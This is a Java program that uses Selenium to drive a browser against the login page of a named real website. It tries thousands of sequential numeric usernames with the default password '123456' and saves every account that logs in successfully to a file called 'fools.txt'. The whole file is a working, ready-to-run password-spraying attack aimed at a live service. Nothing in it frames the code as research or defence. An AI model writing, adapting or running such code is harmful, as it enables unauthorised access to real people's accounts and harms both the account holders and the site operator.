import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.firefox.FirefoxDriver;

public class passwordProvider 
{	
	public static void main(String args[]) throws IOException
	{
		System.setProperty("webdriver.gecko.driver", "D:\\Workspace\\Python\\geckodriver.exe");
		WebDriver driver= new FirefoxDriver();
		File file = new File("fools.txt");
		if(!file.exists()) file.createNewFile();
		FileWriter fw = new FileWriter(file.getAbsoluteFile());
		BufferedWriter bw = new BufferedWriter(fw);
		long start = 160900000;
		for(int j = 7000; j <= 60000;j+=1000)
		{
			for(int i=0;i<300;i++)
			{
				driver.get("http://i-on.in/loginpage.aspx");
				WebElement element = driver.findElement(By.id("loginform"));
				element.click();
				element = driver.findElement(By.id("txtUserName"));
				element.sendKeys(String.valueOf(start+i+j));
				element = driver.findElement(By.id("txtlogPassword"));
				element.sendKeys("123456");
				element = driver.findElement(By.name("btnSubmit"));
				element.click();
				long sT = System.currentTimeMillis();
				while(true)
				{
					if(System.currentTimeMillis()-sT > 2500)
						break;
				}
				String s = driver.getCurrentUrl();
				if(s.equalsIgnoreCase("http://i-on.in/Masters/MyProfile.aspx"))
				{
					System.out.println("Success");
					bw.write(String.valueOf(start+i+j));
					bw.newLine();
				}		
			}
		}
		bw.close();
		fw.close();
		driver.close();
	}
}
